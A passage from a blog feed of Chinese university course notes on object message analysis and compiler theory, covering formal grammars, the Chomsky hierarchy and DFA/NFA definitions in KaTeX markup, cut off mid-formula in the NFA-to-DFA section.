alt></li></ul></li><li><p>分析和确定对象之间的消息</p><ul><li>确定消息的名称<ul><li>直接反映了对象间交互的意图，也体现了接收方对象所对应的类需承担的职责和任务</li><li>意图：请求、通知</li><li>一般地，消息名称用动名词来表示</li></ul></li><li>确定消息传递的信息<ul><li>信息：通知和请求的内容</li><li>这些信息通常以消息参数的形式出现，也即一个对象在向另一个对象发送消息的过程中，需要提供必要的参数，以向目标对象提供相应的信息</li></ul></li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理</title>
      <link href="/2023/04/11/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86_%E8%AF%BE%E7%A8%8B/"/>
      <url>/2023/04/11/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86_%E8%AF%BE%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="2%E6%96%87%E6%B3%95%E5%92%8C%E8%AF%AD%E8%A8%80%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%AE%9A%E4%B9%89" tabindex="-1">2文法和语言的形式定义</h2><h3 id="1-%E6%96%87%E6%B3%95%E5%8F%8A%E5%85%B6%E5%88%86%E7%B1%BB" tabindex="-1">1 文法及其分类</h3><ul><li><p>文法是产生式的又穷非空的集合</p></li><li><p>文法<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>是一个四元组，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo stretchy="false">[</mo><mi>S</mi><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator="true">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator="true">,</mo><mi>P</mi><mo separator="true">,</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G[S]=(V_N,V_T,P,S)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span></span></span></span></eq></p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>N</mi></msub><mo>:</mo></mrow><annotation encoding="application/x-tex">V_N:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>非终结符号集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>T</mi></msub><mo>:</mo></mrow><annotation encoding="application/x-tex">V_T:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>终结符号集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">P:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>表示产生式的有穷非空集合</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">S:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>开始符号（识别符号），至少在一条产生式中作为左部</li></ul></li><li><p>文法分类：</p><ul><li>乔姆斯基(Chomsky)把文法分成四种类型：0型、1型、2型和3型</li><li>0型文法 短语结构文法 Phrase Structure Gramma</li><li>1型文法 上下文有关文法 Context-Sensitive Gramma</li><li>2型文法 上下文无关文法 Context Free Gram</li><li>3型文法 正规(正则)文法 Regular Gramma<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%96%87%E6%B3%95%E7%9A%84%E5%88%86%E7%B1%BB.jpg" alt="文法的分类"></li></ul></li></ul><h3 id="2-%E8%AF%AD%E8%A8%80%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%AE%9A%E4%B9%89" tabindex="-1">2 语言的形式定义</h3><h2 id="3%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">3词法分析</h2><h3 id="1-dfa" tabindex="-1">1 DFA</h3><ul><li><p>确定的有穷自动机的形式定义<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>F</mi><mi>A</mi><mtext>，</mtext><mi>D</mi><mi>F</mi><mi>A</mi><mo>=</mo><mo stretchy="false">(</mo><mi>Q</mi><mo separator="true">,</mo><mo>∑</mo><mo separator="true">,</mo><mi>t</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">DFA， DFA=(Q,\sum,t,q_0,F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mclose">)</span></span></span></span></eq></p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">Q:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>有穷非空的状态集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∑</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">\sum:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>有穷的输入字母表</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">t:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>映射<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>×</mo><mo>∑</mo><mo>→</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q\times \sum \rightarrow Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub><mo>:</mo><mo>∈</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">q_0:\in Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq>，是开始状态集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>:</mo><mo>⊆</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">F:\subseteq Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:⊆</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq>，非空终止状态集合</li></ul></li><li><p>FA的表示</p><ul><li><ol><li>状态转换表</li></ol></li><li><ol start="2"><li>状态转换图<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/DFA%E7%9A%84%E8%A1%A8%E7%A4%BA.jpg" alt="DFA的表示"></li></ol></li></ul></li><li><p>被<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">DFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span></span></span></span></eq> <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>识别的字符转集合记为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq></p></li><li><p>确定的有穷自动机中确定的含义：</p><ul><li><ol><li>只有唯一的一个开始状态</li></ol></li><li><ol start="2"><li>下一个输入字母唯一地确定了下一个状态</li></ol></li></ul></li></ul><h3 id="2-nfa" tabindex="-1">2 NFA</h3><ul><li>非确定的有穷自动机地形式定义<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">NF</span><span class="mord mathnormal">A</span></span></span></span></eq> <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>F</mi><mi>A</mi><mo>=</mo><mo stretchy="false">(</mo><mi>Q</mi><mo separator="true">,</mo><mo>∑</mo><mo separator="true">,</mo><mi>t</mi><mo separator="true">,</mo><msub><mi>Q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">NFA=(Q,\sum,t,Q_0,F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">NF</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mclose">)</span></span></span></span></eq><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">Q:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>有穷非空的状态集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∑</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">\sum:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>有穷的输入字母表</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">t:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>映射<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>×</mo><mo>∑</mo><mo>→</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q\times \sum \rightarrow Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mn>0</mn></msub><mo>:</mo><mo>∈</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q_0:\in Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq>，是开始状态集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>:</mo><mo>⊆</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">F:\subseteq Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:⊆</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq>，非空终止状态集合</li></ul></li></ul><p>如果两个有穷自动机<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">A_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">A_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><msub><mi>A</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><msub><mi>A</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(A_1)=L(A_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq>，则称有穷状态自动机<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">A_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">A_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是等价的</p><h3 id="3-nfa%E5%88%B0dfa%E7%9A%84%E8%BD%AC%E6%8D%A2" tabindex="-1">3 NFA到DFA的转换</h3><h4 id="nfa%E7%9A%84%E7%A1%AE%E5%AE%9A%E5%8C%96" tabindex="-1">NFA的确定化</h4><ul><li>基本思想：将状态间的转换关系映射成状态子集间的转换关系</li><li>方法：子集法，造表法</li><li>NFA存在的问题<ul><li><ol><li>开始状态的不确定</li></ol></li><li><ol start="2"><li>状态转换的不确定</li></ol></li><li><ol start="3"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>的存在的不确定性</li></ol></li></ul></li></ul><ol><li>状态子集<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation 